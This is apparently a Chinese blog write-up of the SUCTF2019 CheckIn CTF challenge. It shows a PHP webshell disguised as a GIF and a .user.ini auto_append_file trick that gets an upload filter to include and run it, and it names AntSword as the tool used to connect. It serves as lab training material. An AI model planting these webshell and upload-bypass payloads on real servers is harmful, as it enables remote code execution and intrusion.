---
title: SUCTF2019 CheckIn
date: 2023-11-28
categories:
  - CTF
  - Web
---

## 前置工作

进入靶机网页，映入眼帘的文件上传入口

![](https://z1.ax1x.com/2023/11/28/piDiaNR.png)

直接扔一个改良版图片马进去，文件名为 `cmd.gif`（别问，问就是没改良过的会因为有 `<?` 而被拦截，然后与 php 搭边的文件后缀一概被拦截，无一例外，只能从别的方向入手）

```php
GIF89a
<script language="php">
eval($_REQUEST['cmd']);
</script>
```

上传成功，回显如下

![](https://z1.ax1x.com/2023/11/28/piDiIv8.png)

那么思路就很明确了，要么是 `.htaccess`，要么是 `.user.ini`，如果当前服务器是 Apache，那就选前者，如果是 Nginx，就选后者，很不巧，Wappalyzer 说这个是 Nginx，那么我们就可以构造 `.user.ini` 配置文件了

实际上，这道题摆明了 `.user.ini` 的还是上传目录下有一个 `index.php`，只要我 `.user.ini` 构造出能让该文件自动包含我的图片马，那就能获得控制权

## 构造 `.user.ini`

### 具体原理

`.user.ini` 是一个特殊的配置文件，用于在 PHP 5.3.0 及更高版本中指定特定目录的配置选项。它的作用类似于 Apache 服务器中的 `.htaccess` 文件

`.user.ini` 文件主要用于 CGI/FastCGI SAPI 的处理。这意味着只有在服务器上运行 PHP 的 CGI 或 FastCGI 模式时，`.user.ini` 文件才会被解析和使用。一般来说，如果你使用共享主机或虚拟主机服务，通常会支持此功能。但如果你使用独立服务器或其他非标准配置，可能需要检查服务器设置是否允许使用 `.user.ini` 文件

`.user.ini` 文件中的两个常见配置选项是 `auto_prepend_file` 和 `auto_append_file`。它们分别指定了一个文件的路径，该文件会在执行 PHP 文件之前（auto_prepend_file）或之后（auto_append_file）自动包含进来

举个例子，假设你的项目目录中有一个名为 `index.php` 的可执行文件，你可以在与 `index.php` 同级的目录下创建一个名为 `.user.ini` 的文件，并在其中添加如下内容：

```
auto_prepend_file = /path/to/file.php
auto_append_file = /path/to/another_file.php
```

在这个例子中，`/path/to/file.php` 文件将会在执行 `index.php` 之前被自动包含进来，而 `/path/to/another_file.php` 文件则会在执行 `index.php` 之后被自动包含进来

这个特性的妙用之处在于，你可以通过在 `.user.ini` 文件中设置 `auto_prepend_file` 和 `auto_append_file` 来自动包含一些公共代码或功能，而无需在每个 PHP 文件中手动引入。这样可以提高开发效率和代码的可维护性

需要注意的是，只有在 **CGI/FastCGI** 模式下才会解析和使用 `.user.ini` 文件。如果你的服务器不支持这种模式，那么 `.user.ini` 文件将不起作用

此外，请确保 `.user.ini` 文件位于要执行的 PHP 文件所在的目录下，并且具有正确的文件权限，以便服务器可以读取和解析它

总结来说，`.user.ini` 文件是用于在指定目录中配置 PHP 选项的一种方法，特别适用于 CGI/FastCGI 模式。它的主要作用是通过设置 `auto_prepend_file` 和 `auto_append_file` 实现自动包含文件的功能，提高代码复用性和开发效率

### 属于这道题的 `.user.ini`

```
GIF89a
auto_append_file=cmd.gif
```

还是老方法，直接上传，上传完回显如下

![](https://z1.ax1x.com/2023/11/28/piDFpKU.png)

此时当我们访问 `http://058f8abf-f188-4e67-8f17-d2b0d33ed166.node4.buuoj.cn:81/uploads/c55e0cb61f7eb238df09ae30a206e5ee/index.php`

你就可以看到清晰的几个大字

```
GIF89a
```

说明我们的图片马被成功包含了

## 攻入靶机

使用蚁剑连接，可以找到 Flag，最后的结果是 `flag{76446301-92d7-4238-a6c7-48b2bd849a49}`